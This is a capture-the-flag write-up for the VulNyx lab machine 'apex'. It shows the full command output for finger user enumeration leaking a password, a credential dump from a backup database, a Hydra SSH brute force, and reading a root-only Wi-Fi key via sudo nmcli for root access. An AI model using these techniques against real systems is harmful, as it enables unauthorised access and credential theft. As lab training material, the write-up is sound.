# apex

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| apex | d4t4s3c | Easy | VulNyx |

**Summary:** The apex machine exposed three services: SSH on port 22, a legacy finger daemon on port 79, and an Apache site titled "The all seeing eye..." whose only content was an image of the Egyptian god Horus. The finger daemon leaked the account record of the user `horus` and, unusually, his personal notes containing the string `H0Ru$$3rv3`. That password unlocked HTTP Basic authentication on a `/backup` directory found by Gobuster, which hosted a SQLite database of user credentials. The database dump exposed four Egyptian themed usernames with random looking passwords, and a targeted Hydra run against SSH correlated each password with its owner, revealing a password swap: the valid pair was `seth` with the password stored under `amon`'s record. As `seth`, sudo enumeration showed passwordless access to `/usr/bin/nmcli`, and the `-s` flag of `nmcli connection show` printed the full properties of a stored `MikroTik_AP` Wi-Fi profile, including its pre-shared key `WIFI_p@$$w0rd_is_$up3r_$3cur3`. That credential was reused for the root account, and `su` delivered a root shell, completing the compromise.

---

## Reconnaissance

The engagement began with host discovery on the lab network, followed by a full TCP port scan and service fingerprinting of the target.

1. An Nmap ARP sweep located the machine at `192.168.56.170`:

```zsh
~/projects/labs/nyx                                                                                    08:56:47  
❯ sudo nmap -sn -PR 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 08:56 +0700  
Nmap scan report for 192.168.56.100  
Host is up (0.00034s latency).  
MAC Address: 08:00:27:3A:3E:6E (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.170  
Host is up (0.00073s latency).  
MAC Address: 08:00:27:FB:B6:51 (Oracle VirtualBox virtual NIC)  
Nmap scan report for 192.168.56.1  
Host is up.  
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.70 seconds
```

2. The target IP was pinned and a full TCP scan with service and version detection was launched. Three ports answered: SSH, finger, and HTTP:

```zsh
~/projects/labs/nyx                                                                                    08:56:53  
❯ ip=192.168.56.170  
  
~/projects/labs/nyx                                                                                    08:57:15  
❯ nmap -p- -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-07 08:57 +0700  
Nmap scan report for 192.168.56.170  
Host is up (0.00017s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)  
| ssh-hostkey:    
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)  
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)  
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)  
79/tcp open  finger  Linux fingerd  
|_finger: No one logged on.\x0D  
80/tcp open  http    Apache httpd 2.4.62 ((Debian))  
|_http-server-header: Apache/2.4.62 (Debian)  
|_http-title: The all seeing eye...  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
```

The finger daemon immediately stood out. Like the service on the `fing` machine, it would answer queries about arbitrary local users, which makes it a natural username oracle, and this box pairs it with a deliberately mythological theme. The HTTP title, "The all seeing eye...", was itself a nod to the Eye of Horus, which suggested the web content and the finger enumeration would converge on the same name.

3. The web service was fingerprinted with `whatweb` and its root page was pulled with `curl` to inspect the markup:

```zsh
~/projects/labs/nyx                                                                                    09:00:34  
❯ whatweb http://$ip  
http://192.168.56.170 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4  
.62 (Debian)], IP[192.168.56.170], Title[The all seeing eye...]  
  
~/projects/labs/nyx                                                                                    09:01:01  
❯ curl -i http://$ip                                                                                    
HTTP/1.1 200 OK  
Date: Mon, 07 Sep 2026 02:01:07 GMT  
Server: Apache/2.4.62 (Debian)  
Last-Modified: Tue, 21 Jan 2025 18:58:52 GMT  
ETag: "36e-62c3bf7c7a10f"  
Accept-Ranges: bytes  
Content-Length: 878  
Vary: Accept-Encoding  
Content-Type: text/html  
  
<!DOCTYPE html>  
<html lang="en">  
<head>  
   <meta charset="UTF-8">  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
   <title>The all seeing eye...</title>  
   <style>  
       body {  
           margin: 0;  
           padding: 0;  
           display: flex;  
           flex-direction: column;  
           justify-content: center;  
           align-items: center;  
           height: 100vh;  
           background-color: white;  
           font-family: 'Papyrus', 'Fantasy';  
       }  
       img {  
           width: 17%;  
           max-width: 100%;  
           height: auto;  
       }  
       .text {  
           margin-top: 20px;  
           font-size: 2.1em;  
           color: #333333;  
           text-align: center;  
       }  
   </style>  
</head>  
<body>  
   <img src="img.png">  
   <div class="text">The all seeing eye...</div>  
</body>  
</html>
```

The page contained a single picture of Horus, the Egyptian sky god whose eye motif matches the title. That imagery was the first concrete hint that `horus` would be a meaningful identity on this system.

4. Directory fuzzing against the web root uncovered a `/backup` endpoint protected by HTTP Basic authentication:

```zsh
~/projects/labs/nyx                                                                                    09:01:08  
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-med  
ium.txt -x txt,php,html       
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.170/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.  
txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              txt,php,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.html           (Status: 200) [Size: 878]  
backup               (Status: 401) [Size: 461]  
server-status        (Status: 403) [Size: 279]  
Progress: 882228 / 882228 (100.00%)  
===============================================================  
Finished  
===============================================================
```

The `/backup` directory returned a 401 status, confirming credentials were required before its contents could be listed. With no credentials yet, attention turned to the finger daemon.

### Username Enumeration and Password Leak over finger

5. A bare query to the finger daemon confirmed it was answering, reporting that no one was logged on:

```zsh
  
~/projects/labs/nyx                                                                                    09:05:34  
❯ finger @$ip  
[192.168.56.170]  
No one logged on.
```

6. Guided by the Horus imagery on the web page, the daemon was queried directly for the user `horus`, and the response went far beyond a simple existence check. It disclosed the home directory, shell, and mail forwarding details, and appended a set of personal notes containing the string `H0Ru$$3rv3`:

```zsh
~/projects/labs/nyx                                                                                 8s 09:06:22  
❯ finger horus@$ip  
[192.168.56.170]  
Login: horus                            Name:    
Directory: /home/horus                  Shell: /bin/bash  
Never logged in.  
Mail forwarded to horus@point.nyx  
No mail.  
PGP key:  
personal notes: H0Ru$$3rv3  
No Plan.
```

The account `horus` was confirmed to exist with a bash shell, and the `personal notes` line leaked what was almost certainly his password, `H0Ru$$3rv3`. The natural next step was to try those credentials against the authenticated `/backup` directory.

---

## Initial Access

### HTTP Basic Authentication with Leaked finger Notes

7. The `/backup` directory was opened in a browser and the credentials `horus` and `H0Ru$$3rv3` were entered into the Basic authentication prompt:

![](apex/image.png)

8. The prompt was accepted and the directory listing loaded, revealing a single file, `database.db`:

![](apex/image-1.png)

The listing showed `database.db` at roughly 8.0K, last modified in January 2025. The file was downloaded and identified as a SQLite 3 database:

```zsh
~/projects/labs/nyx                                                                                    09:16:17  
❯ file database.db  
database.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 5, database pages 2, c  
ookie 0x1, schema 4, UTF-8, version-valid-for 5
```

9. The full database was dumped with `sqlite3`, exposing a `users` table with four Egyptian themed accounts and their plaintext passwords:

```zsh
~/projects/labs/nyx                                                                                    09:16:58  
❯ sqlite3 database.db ".dump"     
PRAGMA foreign_keys=OFF;  
BEGIN TRANSACTION;  
CREATE TABLE users (  
   id INTEGER PRIMARY KEY,  
   user TEXT NOT NULL,  
   password TEXT NOT NULL  
);  
INSERT INTO users VALUES(1,'anubis','L44NxKRnP7wxrBsxibpDORySkbEHRO'),  
 (2,'amon','xqRu08ZA3BihR4lKdJVYcP1x6HjZUf'),  
 (3,'seth','Hm7iYkj2jXDxPUwoW2COs42YjPaC4P'),  
 (4,'osiris','ITA96l3isg4uV2Sm8eYn41XVfxprFy');  
COMMIT;
```

10. The usernames and passwords were split into two wordlists for a credential attack:

```zsh
~/projects/labs/nyx                                                                                35s 09:21:28  
❯ cat users.txt    
anubis  
amon  
seth  
osiris  
  
~/projects/labs/nyx                                                                                20s 09:22:00  
❯ cat pass.txt    
L44NxKRnP7wxrBsxibpDORySkbEHRO  
xqRu08ZA3BihR4lKdJVYcP1x6HjZUf  
ITA96l3isg4uV2Sm8eYn41XVfxprFy  
Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
```

### SSH Credential Brute Force

11. Hydra was run against the SSH service with both lists, letting it correlate every username against every password. The hit came quickly: `seth` authenticated with `xqRu08ZA3BihR4lKdJVYcP1x6HjZUf`, which is the password the database stores under `amon`'s record:

```zsh
~/projects/labs/nyx                                                                                    09:22:02  
❯ hydra -L users.txt -P pass.txt ssh://$ip -t 4 -I              
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organiz  
ations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 09:22:39  
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:4/p:4), ~4 tries per task  
[DATA] attacking ssh://192.168.56.170:22/  
[22][ssh] host: 192.168.56.170   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-07 09:22:54  
  
~/projects/labs/nyx                                                                                15s 09:22:54  
❯ ssh seth@$ip                                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
seth@192.168.56.170's password:    
seth@apex:~$ id  
uid=1001(seth) gid=1001(seth) grupos=1001(seth)  
seth@apex:~$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
horus:x:1000:1000::/home/horus:/bin/bash  
seth:x:1001:1001::/home/seth:/bin/bash
```

The SSH session as `seth` was established. The `/etc/passwd` listing confirmed only `root`, `horus`, and `seth` carry login shells, and since `horus` is fingerable but had never logged in, `seth` was the working foothold.

---

## Privilege Escalation

### Leaking a Stored Wi-Fi Pre-Shared Key through nmcli

12. Sudo enumeration for `seth` revealed a single passwordless entry, `/usr/bin/nmcli`:

```zsh
seth@apex:~$ /usr/sbin/sudo -l  
Matching Defaults entries for seth on apex:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User seth may run the following commands on apex:  
   (root) NOPASSWD: /usr/bin/nmcli
```

The NetworkManager command line client runs as root and can inspect every connection profile on the system, including Wi-Fi profiles whose pre-shared keys are normally readable only by root. The profile list was queried first:

13. The root context confirmed one stored Wi-Fi profile named `MikroTik_AP`, and a filesystem search located its backing file, readable only by root:

```zsh
seth@apex:~$ /usr/sbin/sudo -u root nmcli connection show  
NAME         UUID                                  TYPE  DEVICE    
MikroTik_AP  e25d230b-bb26-4488-b2e0-1b94dac2b9cd  wifi  --        
seth@apex:~$ find / -name MikroTik_AP 2>/dev/null  
/etc/NetworkManager/system-connections/MikroTik_AP  
seth@apex:~$ ls -la /etc/NetworkManager/system-connections/MikroTik_AP    
-rw------- 1 root root 227 ene 21  2025 /etc/NetworkManager/system-connections/MikroTik_AP  
seth@apex:~$
```

The backing file `/etc/NetworkManager/system-connections/MikroTik_AP` is a root only file, which is exactly what makes the next command interesting. `nmcli` running as root can read it even though `seth` cannot.

14. Running `nmcli connection show` with the `-s` (show-secrets) flag against the profile printed its full property set, including the Wi-Fi pre-shared key:

```zsh
seth@apex:~$ /usr/sbin/sudo -u root nmcli -s connection show MikroTik_AP  
connection.id:                          MikroTik_AP  
connection.uuid:                        e25d230b-bb26-4488-b2e0-1b94dac2b9cd  
connection.stable-id:                   --  
connection.type:                        802-11-wireless  
connection.interface-name:              --  
connection.autoconnect:                 sí  
connection.autoconnect-priority:        0  
connection.autoconnect-retries:         -1 (default)  
connection.multi-connect:               0 (default)  
connection.auth-retries:                -1  
...  
802-11-wireless-security.wep-key-type:  unknown  
802-11-wireless-security.psk:           WIFI_p@$$w0rd_is_$up3r_$3cur3  
...
```

The `802-11-wireless-security.psk` field leaked the value `WIFI_p@$$w0rd_is_$up3r_$3cur3`. On a machine this themed, a password of this quality is rarely meant for the access point. It was almost certainly reused for a local account.

15. The password was reused against the root account via `su`, which succeeded and granted a root shell. Both flags were read from the root session:

```zsh
seth@apex:~$ su - root  
Contraseña:    
root@apex:~# id;whoami;hostname  
uid=0(root) gid=0(root) grupos=0(root)  
root  
apex  
root@apex:~# cat /home/seth/user.txt /root/root.txt    
cb9...  
c03...
```

The `uid=0` output confirmed full compromise. The password leaked from the NetworkManager profile was reused on the root account, closing the chain from a finger daemon footnote to a root shell.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep located the target at `192.168.56.170`, and a full Nmap scan exposed SSH on port 22, a finger daemon on port 79, and Apache serving a Horus themed page on port 80.

2. **Vulnerability Discovery**: Directory fuzzing found a Basic authenticated `/backup` directory, and the finger daemon disclosed the full account record for `horus` including personal notes leaking the password `H0Ru$$3rv3`.

3. **Exploitation**: The leaked password unlocked `/backup`, where a SQLite database held four Egyptian themed username and password pairs. Hydra against SSH found the valid pair was `seth` with the password stored under `amon`, delivering an interactive shell.

4. **Internal Enumeration**: Sudo rules for `seth` showed passwordless root access to `/usr/bin/nmcli`, and `nmcli connection show` listed a stored `MikroTik_AP` Wi-Fi profile backed by a root only file.

5. **Privilege Escalation**: The `-s` flag of `nmcli` running as root printed the profile's pre-shared key, `WIFI_p@$$w0rd_is_$up3r_$3cur3`, which was reused as the root password through `su`, yielding a root shell and both flags.
